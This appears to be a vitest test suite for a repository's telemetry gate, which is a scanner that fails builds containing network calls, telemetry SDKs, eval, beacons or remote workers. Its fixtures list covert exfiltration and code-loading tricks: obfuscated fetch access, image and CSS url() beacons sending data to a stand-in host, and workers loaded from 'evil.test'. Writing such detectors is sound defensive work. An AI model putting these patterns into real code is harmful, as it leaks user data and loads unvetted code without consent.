// Self-test of tools/check_telemetry_claims.mjs: it must pass on this repository and FAIL on
// each kind of network transport, SDK, stale allow-list entry and unanchored doc claim.
import { afterEach, describe, expect, it } from 'vitest';
import {
  ALLOW_LIST,
  checkDocAnchors,
  isTelemetryPackage,
  lockfilePackages,
  runGate,
  scanRepo,
  scanSource,
} from '../check_telemetry_claims.mjs';
import { REPO, cleanup, makeTree, runCli } from './fixture.mjs';

afterEach(cleanup);
const kinds = (code, allow = []) => scanSource('apps/web/src/x.ts', code, { allow }).map((f) => f.kind);

describe('telemetry gate: this repository', () => {
  it('passes (allow-list intact, no SDK, docs anchored)', () => {
    expect(runGate(REPO)).toEqual([]);
  });
  it('every allow-listed file exists and holds only allowances it needs', () => {
    expect(scanRepo(REPO).filter((f) => f.kind === 'allow-list')).toEqual([]);
    expect(Object.keys(ALLOW_LIST).length).toBeGreaterThanOrEqual(3);
  });
});

describe('telemetry gate: network transports are findings', () => {
  it.each([
    ['fetch call', "await fetch('/x');"],
    ['fetch reference', 'const f = fetch;'],
    ['globalThis.fetch', "globalThis.fetch('/x');"],
    ['window.fetch', "window.fetch('/x');"],
    ['bracket access', "self['fetch']('/x');"],
    ['computed access on globalThis', 'const n = "fe"; globalThis[n + "tch"]("/x");'],
    ['XMLHttpRequest', 'const x = new XMLHttpRequest();'],
    ['WebSocket', "new WebSocket('wss://x.test');"],
    ['EventSource', "new EventSource('/s');"],
    ['sendBeacon', "navigator.sendBeacon('/b', 'x');"],
    ['sendBeacon by bracket', "navigator['sendBeacon']('/b');"],
    ['importScripts', "importScripts('https://x.test/a.js');"],
    ['axios import', "import axios from 'axios';"],
    ['node:https import', "import https from 'node:https';"],
    ['require of a network package', "const ws = require('ws');"],
    ['value import of the capped-fetch helper', "import { cappedFetch } from '../net/capped-fetch';"],
    ['re-export of the helper', "export { cappedFetch } from './net/capped-fetch';"],
  ])('%s', (_name, code) => {
    expect(kinds(code)).toContain('network');
  });

  it('type positions, comments and look-alike words are fine', () => {
    expect(kinds('type F = typeof fetch; interface O { fetch?: F; sendBeacon: 1 } type K = "fetch";')).toEqual([]);
    expect(kinds("// fetch(url)\nconst s = 'fetch(url) XMLHttpRequest'; const fetched = 1; const FetchLike = 2;")).toEqual([]);
    expect(kinds("import type { FetchLike } from '../net/capped-fetch';")).toEqual([]);
    expect(kinds("import { type FetchLike } from '../net/capped-fetch';")).toEqual([]);
  });
  it.each([
    ['a property called fetch', 'const o = { fetch: 1 }; o.fetch;'],
    ['a string that is exactly "fetch"', "const s = 'fetch';"],
    ['a template that is exactly "fetch"', 'const s = `fetch`;'],
    ['a concatenation that folds to "fetch"', "const s = 'fe' + 'tch';"],
    ['a template that folds to "XMLHttpRequest"', 'const s = `${"XMLHttp"}Request`;'],
    ['an element-access string key', "const f = o['fetch'];"],
    ['a destructuring property name', 'const { fetch: f } = o;'],
    ['a shorthand destructuring', 'const { fetch } = o;'],
    ['the sendBeacon property name', 'const b = o.sendBeacon;'],
    ['a destructured sendBeacon', 'const { sendBeacon } = navigator;'],
    ['a bound sendBeacon', 'const b = navigator.sendBeacon.bind(navigator);'],
    ['a computed sendBeacon', "navigator['send' + 'Beacon']('/b', 'x');"],
    ['an aliased global', "const g = globalThis; g.fetch('/x');"],
    ['an aliased window, bracket access', "const w = window; w['fetch']('/x');"],
    ['an alias through a property chain', 'const g = window.self; g[k]("/x");'],
    ['a computed key on an alias', "const g = globalThis; const k = f(); g[k]('/x');"],
    ['a destructured fetch from the global', "const { fetch: f } = globalThis; f('/x');"],
    ['an alias in a parameter default', 'export const f = (g = globalThis) => g[key];'],
    ['a computed key on navigator', 'navigator[key]("/b");'],
    ['Reflect.get on the global', "Reflect.get(globalThis, 'fe' + 'tch')('/x');"],
    ['Reflect.get on an alias', "const g = globalThis; Reflect.get(g, k)('/x');"],
    ['Reflect.apply on navigator', 'Reflect.apply(Reflect.get(navigator, k), navigator, []);'],
    ['an aliased Reflect', 'const R = Reflect; R.get(globalThis, k);'],
    ['Object.getOwnPropertyDescriptor on the global', 'Object.getOwnPropertyDescriptor(window, k);'],
    ['WebTransport', "new WebTransport('https://x.test');"],
  ])('%s is a finding', (_n, code) => {
    expect(kinds(code, ['script', 'dynamic-import'])).toEqual(expect.arrayContaining([expect.stringMatching(/network|global-alias/)]));
    expect(scanSource('apps/web/src/x.ts', code, { allow: ['script', 'dynamic-import'] }).length).toBeGreaterThan(0);
  });

  it('an allow-list entry suppresses network findings, never telemetry ones', () => {
    expect(kinds("await fetch('/x');", ['network'])).toEqual([]);
    expect(kinds("import * as S from '@sentry/browser'; await fetch('/x');", ['network', 'script', 'dynamic-import'])).toEqual(['telemetry']);
  });
});

describe('telemetry gate: code evaluation, navigation, aliasing', () => {
  it.each([
    ['eval', "eval('1');"],
    ['an indirect eval', "(0, eval)('this');"],
    ['globalThis.eval', "globalThis.eval('1');"],
    ['new Function', "new Function('return 1')();"],
    ['Function()', "Function('return 1')();"],
    ['.constructor()', "(() => 1).constructor('return 1')();"],
    ['setTimeout of a string', "setTimeout('doIt()', 0);"],
    ['setInterval of a concatenated string', "setInterval('do' + 'It()', 0);"],
    ['window.setTimeout of a template', 'window.setTimeout(`x()`, 0);'],
    ['the Function string key', "self['Function']('return 1');"],
  ])('%s is an eval finding no allow-list can silence', (_n, code) => {
    expect(kinds(code, ['network', 'script', 'dynamic-import', 'navigation', 'element-url', 'global-alias', 'eval'])).toContain('eval');
  });
  it('setTimeout of a function is fine', () => {
    expect(kinds('setTimeout(() => go(), 0); setTimeout(go, 5);')).toEqual([]);
  });
  it.each([
    ['window.open', "window.open('/a');"],
    ['self.open', "self.open(u);"],
    ['location.href to an absolute URL', "location.href = 'https://x.test/?d=1';"],
    ['window.location.href to a variable', 'window.location.href = u;'],
    ['document.location.href', "document.location.href = 'https://x.test';"],
    ['location assigned directly', "location = 'https://x.test';"],
    ['location.assign', "location.assign('//x.test/a');"],
    ['location.replace of a variable', 'window.location.replace(u);'],
    ['a protocol-relative path', "location.href = '//x.test';"],
  ])('%s is a navigation finding', (_n, code) => {
    expect(kinds(code)).toContain('navigation');
  });
  it('same-origin navigation is fine', () => {
    expect(kinds("location.href = '/privacy'; location.assign('./a'); location.replace('#/today'); location.hash = h; const x = location.hash; location.reload();")).toEqual([]);
    expect(kinds("window.location.replace(`#${route}`);")).toEqual([]);
  });
  it('an alias of the global object is a global-alias finding (allow-listable, by file)', () => {
    expect(kinds('const g = globalThis;')).toEqual(['global-alias']);
    expect(kinds('let g; g = window;')).toEqual(['global-alias']);
    expect(kinds('const scope = self as unknown as W;')).toEqual(['global-alias']);
    expect(kinds('const g = globalThis;', ['global-alias'])).toEqual([]);
    expect(kinds('const d = globalThis.document; const c = globalThis.crypto;')).toEqual([]);
  });
});

describe('telemetry gate: image / element beacons', () => {
  const elementKinds = (code, path = 'apps/web/src/x.tsx') => scanSource(path, code).map((f) => f.kind);
  it.each([
    ['new Image().src', "new Image().src = 'https://x.test/?d=' + d;"],
    ['new Image src from a variable', 'const i = new Image(); i.src = u;'],
    ['a lone slash plus a variable (could become //host)', "const i = new Image(); i.src = '/' + u;"],
    ['createElement img', "const i = document.createElement('img'); i.src = u;"],
    ['createElement iframe', "const f = document.createElement('iframe'); f.src = 'https://x.test';"],
    ['createElement link', "const l = document.createElement('link'); l.rel = 'prefetch'; l.href = u; document.head.append(l);"],
    ['createElement form action', "const f = document.createElement('form'); f.action = 'https://x.test'; f.submit();"],
    ['createElement audio', "const a = document.createElement('audio'); a.src = u;"],
    ['createElement video', "const a = document.createElement('video'); a.src = u;"],
    ['createElement source', "const a = document.createElement('source'); a.src = u;"],
    ['createElement object data', "const o = document.createElement('object'); o.data = u;"],
    ['createElement embed', "const o = document.createElement('embed'); o.src = u;"],
    ['setAttribute src', "const i = document.createElement('img'); i.setAttribute('src', u);"],
    ['setAttribute with a computed name', 'el.setAttribute(name, u);'],
    ['Object.assign on a new element', "Object.assign(document.createElement('img'), { src: u });"],
    ['Object.assign with a spread', "Object.assign(new Image(), { ...p });"],
    ['new Audio(url)', "new Audio('https://x.test/?d=1');"],
    ['a CSS url()', "document.body.style.backgroundImage = 'url(https://x.test/?d=1)';"],
    ['cssText with url()', 'el.style.cssText = `background:url(${u})`;'],
    ['setProperty with url()', "el.style.setProperty('--b', `url(${u})`);"],
    ['innerHTML markup', "el.innerHTML = '<img src=x>';"],
    ['innerHTML from a variable', 'el.innerHTML = html;'],
    ['insertAdjacentHTML', "el.insertAdjacentHTML('beforeend', html);"],
    ['document.write', 'document.write(html);'],
    ['React.createElement img', "React.createElement('img', { src: u });"],
    ['React.createElement iframe with a spread', "React.createElement('iframe', { ...p });"],
    ['a JSX img with a variable', 'export const C = () => <img src={u} alt="" />;'],
    ['a JSX img with an absolute literal', 'export const C = () => <img src="https://x.test/p.png" alt="" />;'],
    ['a JSX img with an absolute literal in braces', "export const C = () => <img src={'https://x.test/?d=1'} alt=\"\" />;"],
    ['a protocol-relative literal', 'export const C = () => <img src="//x.test/p.png" alt="" />;'],
    ['a JSX iframe', 'export const C = () => <iframe src={u} />;'],
    ['a JSX link', 'export const C = () => <link rel="prefetch" href={u} />;'],
    ['a JSX form action', 'export const C = () => <form action={u} />;'],
    ['a JSX form action with an absolute URL', 'export const C = () => <form action="https://x.test/c" />;'],
    ['a JSX audio', 'export const C = () => <audio src={u} />;'],
    ['a JSX video', 'export const C = () => <video src={u} />;'],
    ['a JSX source', 'export const C = () => <source src={u} />;'],
    ['a JSX object data', 'export const C = () => <object data={u} />;'],
    ['a JSX embed', 'export const C = () => <embed src={u} />;'],
    ['a JSX spread onto an img', 'export const C = (p) => <img {...p} />;'],
    ['dangerouslySetInnerHTML', 'export const C = () => <div dangerouslySetInnerHTML={{ __html: h }} />;'],
  ])('%s', (_n, code) => {
    expect(elementKinds(code)).toContain('element-url');
  });
  it('is allow-listable by file, as the element-url kind', () => {
    expect(scanSource('apps/web/src/x.tsx', 'const i = new Image(); i.src = u;', { allow: ['element-url'] })).toEqual([]);
  });
  it.each([
    ['relative literals', "const i = new Image(); i.src = '/icons/a.png'; i.src = './b.png'; i.src = '../c.png'; i.src = '';"],
    ['data: and blob: literals', "const i = new Image(); i.src = 'data:image/png;base64,AAAA'; i.src = `blob:${origin}/x`;"],
    ['an object URL', 'const u = URL.createObjectURL(blob); const a = document.createElement("a"); a.href = u; a.href = URL.createObjectURL(blob);'],
    ['an object URL from an injected env', 'const href = env.url.createObjectURL(blob); anchor.href = href;'],
    ['a data: template', 'const i = new Image(); i.src = `data:image/png;base64,${b64}`;'],
    ['a rooted template', 'const i = new Image(); i.src = `/api/${id}`;'],
    ['a constant resolved in the file', "const ICON = '/icons/a.png'; const i = new Image(); i.src = ICON;"],
    ['a canvas', "const c = document.createElement('canvas'); c.width = 4; Object.assign(c, { width: 1, height: 2 }); c.setAttribute('role', 'img');"],
    ['style without url()', "el.style.width = `${w}px`; el.style.cssText = 'color:red'; el.innerHTML = ''; el.srcObject = stream;"],
    ['same-origin JSX', 'export const C = () => <><img src="/a.png" alt="" /><img src={"./b.png"} alt="" /><img src={`data:image/png;base64,${b}`} alt="" /><video ref={r} /><form onSubmit={s} /><a href={u}>x</a></>;'],
    ['an object URL in JSX', 'const u = URL.createObjectURL(b); export const C = () => <img src={u} alt="" />;'],
    ['a property called src on a plain object', 'const o = { src: u }; const t = { href: u };'],
  ])('%s are fine', (_n, code) => {
    expect(elementKinds(code)).toEqual([]);
  });
  it('a variable reassigned elsewhere is not provably same-origin', () => {
    expect(elementKinds("let u = '/a'; u = other(); const i = new Image(); i.src = u;")).toContain('element-url');
    expect(elementKinds('function f(u) { const i = new Image(); i.src = u; }')).toContain('element-url');
  });
});

describe('telemetry gate: script injection, runtime imports, workers', () => {
  it.each([
    ['createElement script', "document.createElement('script');"],
    ['createElement script (upper case)', "doc.createElement('SCRIPT');"],
    ['createElement with a computed tag', 'doc.createElement(tag);'],
    ['a JSX script tag', 'export const A = () => <script src="/a.js" />;'],
  ])('%s is a script finding', (_n, code) => {
    const path = code.includes('<script') ? 'apps/web/src/x.tsx' : 'apps/web/src/x.ts';
    expect(scanSource(path, code).map((f) => f.kind)).toContain('script');
  });
  it('createElement of a non-script tag is fine', () => {
    expect(kinds("document.createElement('canvas');")).toEqual([]);
  });
  it.each([
    ['a template URL', 'await import(`${base}/m.mjs`);'],
    ['a variable', 'await import(u);'],
    ['an absolute URL', "await import('https://cdn.test/m.js');"],
  ])('import() of %s is a finding', (_n, code) => {
    expect(kinds(code)).toContain('dynamic-import');
  });
  it('import() of a relative literal is fine', () => {
    expect(kinds("await import('./components/gallery');")).toEqual([]);
  });
  it.each([
    ['an absolute URL', "new Worker('https://evil.test/w.js');"],
    ['a variable', 'new Worker(u);'],
    ['a protocol-relative URL', "new Worker(new URL('//evil.test/w.js', import.meta.url));"],
    ['a SharedWorker of an absolute URL', "new SharedWorker('https://evil.test/w.js');"],
    ['a URL against another base', "new Worker(new URL('./w.js', base));"],
    ['a blob URL', "new Worker(URL.createObjectURL(new Blob(['x'])));"],
    ['an alias of the constructor', "const W = Worker; new W('https://evil.test');"],
    ['new globalThis.Worker', "new globalThis.Worker('https://evil.test/w.js');"],
    ['new window.SharedWorker', "new window.SharedWorker(u);"],
    ['the constructor by string key', "new self['Worker'](u);"],
    ['a service worker from another origin', "navigator.serviceWorker.register('https://evil.test/sw.js');"],
    ['a service worker from a variable', 'container.register(url);'],
  ])('a Worker of %s is a finding that no allow-list can silence', (_n, code) => {
    expect(kinds(code, ['network', 'script', 'dynamic-import'])).toContain('worker');
  });
  it('the same-origin worker form is fine', () => {
    expect(kinds("new Worker(new URL('./store.worker.ts', import.meta.url), { type: 'module' });")).toEqual([]);
    expect(kinds("navigator.serviceWorker.register('/sw.js'); const SW = '/sw.js'; container.register(SW, { scope: '/' });")).toEqual([]);
    expect(kinds('type W = Worker; let w: Worker | undefined; const scope = 1 as unknown as DedicatedWorkerGlobalScope;')).toEqual([]);
  });
});

describe('telemetry gate: SDKs by prefix', () => {
  it.each(['@sentry/browser', 'posthog-js', 'mixpanel-browser', '@datadog/browser-rum', 'firebase', 'react-ga4', '@opentelemetry/api', 'logrocket', 'plausible-tracker'])(
    '%s is a telemetry package',
    (name) => expect(isTelemetryPackage(name)).toBe(true),
  );
  it.each(['react', 'vite', 'zxing-wasm', 'segment-tree', '@axe-core/playwright'])('%s is not', (name) =>
    expect(isTelemetryPackage(name)).toBe(false),
  );
  it('an import of an SDK is a finding in every file', () => {
    expect(kinds("import * as Sentry from '@sentry/react';")).toEqual(['telemetry']);
    expect(kinds("export * from 'posthog-js';")).toEqual(['telemetry']);
    expect(kinds("const s = await import('mixpanel-browser');")).toEqual(['telemetry']);
  });
  it('reads names out of a pnpm lockfile', () => {
    const lock = "packages:\n\n  '@sentry/core@8.0.0':\n    resolution: {}\n  react@19.3.0:\n    resolution: {}\n";
    expect(lockfilePackages(lock)).toEqual(['@sentry/core', 'react']);
  });
});

describe('telemetry gate: a checkout', () => {
  // Every allow-listed file exists and still needs what it holds, as in the real repository.
  const USES = {
    network: "export const f = () => fetch('/x');\n",
    script: "export const s = () => document.createElement('script');\n",
    'dynamic-import': 'export const d = (u: string) => import(u);\n',
    navigation: 'export const n = (u: string) => location.replace(u);\n',
    'element-url': 'export const e = (u: string) => { const i = new Image(); i.src = u; };\n',
    'global-alias': 'export const g = globalThis;\n',
  };
  const ALLOWED_FILES = Object.fromEntries(
    Object.entries(ALLOW_LIST).map(([path, e]) => [path, e.kinds.map((k) => USES[k]).join('')]),
  );
  const CLEAN = {
    ...ALLOWED_FILES,
    'apps/web/src/a.ts': 'export const a = 1;\n',
    'packages/core/src/b.ts': 'export const b = 2;\n',
    'package.json': '{"devDependencies":{"typescript":"5.9.3"}}',
    'apps/web/package.json': '{"dependencies":{"react":"19.3.0"}}',
    'docs/x.md': 'This page says no telemetry (see tools/check_telemetry_claims.mjs).',
  };
  it('a clean tree passes, as a CLI too (exit 0)', () => {
    const root = makeTree(CLEAN);
    expect(runGate(root)).toEqual([]);
    expect(runCli('check_telemetry_claims.mjs', root).code).toBe(0);
  });
  it('a violating source file fails the CLI with exit 1', () => {
    const root = makeTree({ ...CLEAN, 'apps/web/src/a.ts': "navigator.sendBeacon('/x');" });
    const r = runCli('check_telemetry_claims.mjs', root);
    expect(r.code).toBe(1);
    expect(r.out).toContain('sendBeacon');
  });
  it('a telemetry SDK in any package.json fails, whatever the kind of dependency', () => {
    for (const key of ['dependencies', 'devDependencies', 'peerDependencies', 'optionalDependencies']) {
      const root = makeTree({ ...CLEAN, 'packages/core/package.json': JSON.stringify({ [key]: { '@sentry/browser': '1.0.0' } }) });
      expect(runGate(root).join('\n')).toContain('telemetry SDK dependency: @sentry/browser');
    }
  });
  it('a network package dependency fails (there is no adapter package to hold one)', () => {
    const root = makeTree({ ...CLEAN, 'apps/web/package.json': '{"dependencies":{"axios":"1.0.0"}}' });
    expect(runGate(root).join('\n')).toContain('network package dependency: axios');
  });
  it('an SDK that only arrives transitively (lockfile) fails', () => {
    const root = makeTree({ ...CLEAN, 'pnpm-lock.yaml': "packages:\n  'posthog-js@1.0.0':\n    resolution: {}\n" });
    expect(runGate(root).join('\n')).toContain('posthog-js');
  });
  it('a fetch outside the allow-list fails; inside it passes; a stale entry fails', () => {
    const files = { ...CLEAN, 'apps/web/src/adapter.ts': "export const g = () => fetch('/x');\n" };
    const root = makeTree(files);
    expect(scanRepo(root, {}).map((f) => f.path)).toContain('apps/web/src/adapter.ts');
    const allowed = { 'apps/web/src/adapter.ts': { kinds: ['network'], reason: 'test' } };
    expect(scanRepo(root, allowed).filter((f) => f.path.endsWith('adapter.ts'))).toEqual([]);
    // Missing file.
    const missing = { 'apps/web/src/gone.ts': { kinds: ['network'], reason: 'test' } };
    expect(scanRepo(root, missing).map((f) => f.message).join()).toContain('does not exist');
    // The adapter stops using the network: the allowance is stale and must be narrowed.
    const stale = makeTree({ ...CLEAN, 'apps/web/src/adapter.ts': 'export const g = 1;\n' });
    expect(scanRepo(stale, allowed).map((f) => f.message).join()).toContain('no longer needs');
    // Allowed for network only: script injection in the same file still fails.
    const mixed = makeTree({ ...CLEAN, 'apps/web/src/adapter.ts': "fetch('/x'); document.createElement('script');" });
    expect(
      scanRepo(mixed, allowed)
        .filter((f) => f.path.endsWith('adapter.ts'))
        .map((f) => f.kind),
    ).toEqual(['script']);
  });
  it('test files are not shipped code', () => {
    const root = makeTree({ ...CLEAN, 'apps/web/src/a.test.ts': "fetch('/x');", 'apps/web/src/test/setup.ts': "fetch('/x');" });
    expect(runGate(root)).toEqual([]);
  });
  it('a shipped file that imports a path the gates treat as non-shipped fails (those directories cannot hide shipped code)', () => {
    for (const dir of ['testing', 'test', '__tests__', 'e2e', 'harness', 'dist']) {
      const root = makeTree({
        ...CLEAN,
        [`apps/web/src/${dir}/hidden.ts`]: "fetch('/x');",
        'apps/web/src/a.ts': `import { x } from './${dir}/hidden';\nexport const a = x;\n`,
      });
      expect(runGate(root).join('\n')).toContain(`apps/web/src/${dir}/hidden.ts`);
    }
    const dyn = makeTree({ ...CLEAN, 'apps/web/src/testing/h.ts': 'export const h = 1;', 'apps/web/src/a.ts': "export const a = () => import('./testing/h.js');\n" });
    expect(runGate(dyn).join('\n')).toContain('non-shipped');
    const reexport = makeTree({ ...CLEAN, 'apps/web/src/e2e/h.ts': 'export const h = 1;', 'packages/core/src/b.ts': "export { h } from '../../../apps/web/src/e2e/h';\n" });
    expect(runGate(reexport).join('\n')).toContain('non-shipped');
  });
  it('type-only imports of non-shipped paths are erased, so they pass; shipped-to-shipped passes', () => {
    const root = makeTree({
      ...CLEAN,
      'apps/web/src/testing/t.ts': 'export type T = 1;',
      'apps/web/src/a.ts': "import type { T } from './testing/t';\nexport type A = T;\n",
      'apps/web/src/c.ts': "import { b } from '../../../packages/core/src/b';\nexport const c = b;\n",
    });
    expect(runGate(root)).toEqual([]);
  });
  it('the shipped public scripts (boot-guard.js) are scanned', () => {
    const root = makeTree({ ...CLEAN, 'apps/web/public/boot-guard.js': "navigator.sendBeacon('/x');", 'apps/web/public/sqlite3mc/big.js': "fetch('/x');" });
    const out = runGate(root).join('\n');
    expect(out).toContain('apps/web/public/boot-guard.js');
    expect(out).not.toContain('sqlite3mc');
  });
  it('a telemetry SDK in ANY package.json in the repo fails (tools/, nested, not just apps/ and packages/)', () => {
    const root = makeTree({
      ...CLEAN,
      'tools/webkit_smoke/package.json': '{"devDependencies":{"@sentry/node":"1.0.0"}}',
      'apps/web/node_modules/x/package.json': '{"dependencies":{"@sentry/node":"1.0.0"}}',
      'apps/web/dist/package.json': '{"dependencies":{"@sentry/node":"1.0.0"}}',
    });
    const out = runGate(root).join('\n');
    expect(out).toContain('tools/webkit_smoke/package.json');
    expect(out).not.toContain('node_modules');
    expect(out).not.toContain('dist/package.json');
  });
  it('a doc claiming "no telemetry" without the gate fails; the posture doc itself is exempt', () => {
    const root = makeTree({ ...CLEAN, 'docs/y.md': 'We ship NO TELEMETRY.', 'docs/telemetry-posture.md': 'No telemetry.' });
    const failures = checkDocAnchors(root);
    expect(failures).toHaveLength(1);
    expect(failures[0]).toContain('docs/y.md');
    // A top-level README is covered too.
    const readme = makeTree({ ...CLEAN, 'README.md': 'no telemetry at all' });
    expect(checkDocAnchors(readme).join()).toContain('README.md');
  });
});
